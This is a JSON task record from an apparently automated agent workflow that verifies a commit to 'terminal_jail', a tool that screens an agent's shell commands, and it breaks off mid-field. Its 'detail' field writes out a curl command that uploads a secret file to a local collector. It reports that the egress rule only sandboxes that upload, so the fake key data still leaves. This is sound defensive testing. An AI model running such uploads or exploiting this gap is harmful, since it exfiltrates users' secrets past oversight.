 {"attempts": 1, "blocked_reason": null, "ci_result": "SKIP", "commit_hash": "3162a25", "completed_at": "2026-09-19T03:44:00+00:00", "detail": "Measured with a real local collector at HEAD 5275a86: bridge verdict for `curl -s -T /tmp/dogfood-tj/secret.txt http://127.0.0.1:18777/collect` -> {\"action\":\"modify\",\"rule_id\":\"builtin-net-curl-upload\"}; the CLI ran the rewritten command `unshare --user --pid --fork --kill-child=SIGKILL bash -c 'curl -s -T \u2026/secret.txt http://127.0.0.1:18777/collect'`, exit 0, and the collector received 132 bytes containing the secret content (FAKE_PRIVATE_KEY_MATERIAL). So builtin-net-curl-upload (and the whole BUILTIN_SANDBOX egress group added by TJ-GAP-058) contains the process; it does not stop the data leaving. The commit message describes the group as covering 'sandbox exfil', and a reader of the README's rule table reasonably reads auto-sandbox as a mitigation \u2014 it is not: on the mapping-less (legacy) branch the sandboxed curl reads the caller's file fine and the upload completes; on a mapped branch the upload fails only because the payload cannot read the caller's files at all (DF-15), not because of any security decision. Net effect: an agent or user who is exfiltrating still succeeds whenever the rule is the only thing in the way.", "dispatched_at": "2026-09-19T03:29:00+00:00", "exit_code": 0, "files_changed": ["CHANGELOG.md", "README.md", "docs/dogfood/diagnostics.md", "docs/quickstart.md", "plugin/terminal_jail/interruptor/blocklist.py", "plugin/terminal_jail/interruptor/sandbox.py", "plugin/terminal_jail/rules/00-builtins.yaml", "plugin/test_egress_no_delivery.py", "plugin/test_escape_waves.py", "plugin/test_interruptor.py", "scripts/yaml-mirror-parity-probe.py", "skills/terminal-jail-usage/SKILL.md", "specs/interruptor.md"], "foreman_note": "Tick #292. Foreman-independent verification of 3162a25 (each check run by the foreman, not transcribed from the worker report): (a) suite .venv/bin/python -m pytest -q -p